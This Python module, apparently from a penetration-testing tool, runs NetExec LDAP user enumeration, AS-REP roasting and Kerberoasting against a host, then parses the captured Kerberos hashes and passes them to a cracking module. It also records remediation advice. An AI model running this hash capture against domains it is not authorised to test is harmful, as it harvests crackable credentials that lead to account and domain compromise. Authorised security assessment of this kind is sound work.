"""LDAP / Kerberos engine (nxc ldap) — user enum + AS-REP and Kerberoast hash capture.

This is the engine that *produces crackable hashes* during normal enumeration
(the non-intrusive subset of "detect a hash and crack it" — no LLMNR/NBT-NS
poisoning). Captured hashes ride along in each finding's `meta["hashes"]` so the
crack module (redness/crack.py) can loot/crack them.

Parsing is pure and separated from subprocess execution (tests use captured output).

Hashes look like:
  $krb5asrep$23$svc-backup@ACME.LOCAL:<hex>$<hex>...
  $krb5tgs$23$*svc-sql$ACME.LOCAL$svc-sql*$<hex>$<hex>...

Reference: https://www.netexec.wiki/ldap-protocol
"""
from __future__ import annotations

import glob
import os
import re
import shutil
import subprocess
import tempfile

from ..findings import Category, Evidence, Finding, Severity
from .base import Engine, Target
from .netexec import strip_log_prefix

_ASREP = re.compile(r"\$krb5asrep\$\S+")
_TGS = re.compile(r"\$krb5tgs\$\S+")
# nxc ldap line: LDAP  <host>  <port>  <name>  <body>
_LDAP_LINE = re.compile(r"^LDAP\s+\S+\s+\d+\s+\S+\s+(?P<body>.*?)\s*$")


def _asrep_account(h: str) -> str:
    # $krb5asrep$23$USER@REALM:...
    m = re.search(r"\$krb5asrep\$\d+\$([^@]+)@", h)
    return m.group(1) if m else "unknown"


def _tgs_account(h: str) -> str:
    # $krb5tgs$23$*USER$REALM$...
    m = re.search(r"\$krb5tgs\$\d+\$\*([^$]+)\$", h)
    return m.group(1) if m else "unknown"


# --------------------------------------------------------------------------- #
# Pure parsers                                                                 #
# --------------------------------------------------------------------------- #
def parse_asrep(raw: str) -> list[tuple[str, str]]:
    """Return (account, hash) for every AS-REP hash in nxc output."""
    out = []
    for h in _ASREP.findall(raw):
        out.append((_asrep_account(h), h))
    # de-dupe by hash, keep order
    seen, uniq = set(), []
    for acc, h in out:
        if h not in seen:
            seen.add(h)
            uniq.append((acc, h))
    return uniq


def parse_kerberoast(raw: str) -> list[tuple[str, str]]:
    out = []
    for h in _TGS.findall(raw):
        out.append((_tgs_account(h), h))
    seen, uniq = set(), []
    for acc, h in out:
        if h not in seen:
            seen.add(h)
            uniq.append((acc, h))
    return uniq


def parse_users(raw: str) -> list[str]:
    """Best-effort user list from `nxc ldap --users` output (skip headers/hashes)."""
    users = []
    for line in raw.splitlines():
        m = _LDAP_LINE.match(strip_log_prefix(line))   # tolerate nxc --verbose/--log prefix
        if not m:
            continue
        body = m.group("body")
        low = body.lower()
        if (not body or body.startswith("[") or "$krb5" in body
                or low.startswith("-username-") or "total" in low
                or low.startswith("username")):
            continue
        user = body.split()[0]
        if user and user not in users:
            users.append(user)
    return users


def _hash_finding(fid: str, title: str, hash_type: str,
                  pairs: list[tuple[str, str]], credentialed: bool) -> Finding:
    accounts = [a for a, _ in pairs]
    return Finding(
        id=fid, title=title, severity=Severity.HIGH, category=Category.KERBEROS,
        description=f"{len(pairs)} account(s) with capturable {hash_type} hashes.",
        impact="The password hash can be cracked offline; a recovered password is a valid "
               "domain credential.",
        remediation=("Enforce Kerberos pre-authentication and strong service-account passwords "
                     "(25+ chars / gMSA)."),
        affected=accounts,
        evidence=[Evidence(source="netexec-ldap", detail=f"{len(pairs)} {hash_type} hash(es)")],
        references=["https://attack.mitre.org/techniques/T1558/"],
        credentialed=credentialed,
        # crack.py reads this:
        meta={"hashes": [{"account": a, "hash": h, "type": hash_type} for a, h in pairs]},
    )


def parse_all(raw: str, credentialed: bool = False) -> list[Finding]:
    findings: list[Finding] = []
    asrep = parse_asrep(raw)
    if asrep:
        findings.append(_hash_finding("krb-asrep-roastable", "AS-REP roastable accounts",
                                      "krb5asrep", asrep, credentialed))
    tgs = parse_kerberoast(raw)
    if tgs:
        findings.append(_hash_finding("krb-kerberoastable", "Kerberoastable accounts",
                                      "krb5tgs", tgs, credentialed))
    users = parse_users(raw)
    if users:
        findings.append(Finding(
            id="enum-domain-users", title="Domain users enumerated",
            severity=Severity.INFO, category=Category.ENUM,
            description="Domain user accounts enumerated via LDAP.",
            affected=users,
            evidence=[Evidence(source="netexec-ldap", detail=f"{len(users)} users")],
            credentialed=credentialed,
        ))
    return findings


class LdapEngine(Engine):
    name = "netexec-ldap"

    def __init__(self, timeout: int = 300):
        self.timeout = timeout

    def _bin(self):
        return shutil.which("nxc") or shutil.which("netexec")

    def is_available(self) -> bool:
        return self._bin() is not None

    def _auth(self, t: Target) -> list[str]:
        args = ["-u", t.username or ""]
        if t.nthash:
            args += ["-H", t.nthash]
        else:
            args += ["-p", t.password if t.password is not None else ""]
        if t.kerberos:
            args += ["-k"]
        if t.domain:
            args += ["-d", t.domain]
        return args

    def _invoke(self, extra: list[str], t: Target) -> str:
        exe = self._bin()
        if not exe:
            return ""
        cmd = [exe, "ldap", t.host] + self._auth(t) + extra
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout)
        except (subprocess.TimeoutExpired, OSError):
            return ""
        return (p.stdout or "") + "\n" + (p.stderr or "")

    def run(self, t: Target) -> list[Finding]:
        if not self.is_available():
            return []
        self.emit_probe(target=t.host, test="ldap")
        with tempfile.TemporaryDirectory() as td:
            asrep_out = os.path.join(td, "asrep.txt")
            tgs_out = os.path.join(td, "tgs.txt")
            raw = "\n".join([
                self._invoke(["--users"], t),
                self._invoke(["--asreproast", asrep_out], t),
                self._invoke(["--kerberoasting", tgs_out], t),
            ])
            # nxc also writes hashes to files; fold those in.
            for f in glob.glob(os.path.join(td, "*.txt")):
                try:
                    with open(f, encoding="utf-8", errors="replace") as fh:
                        raw += "\n" + fh.read()
                except OSError:
                    pass
        return parse_all(raw, credentialed=t.credentialed)
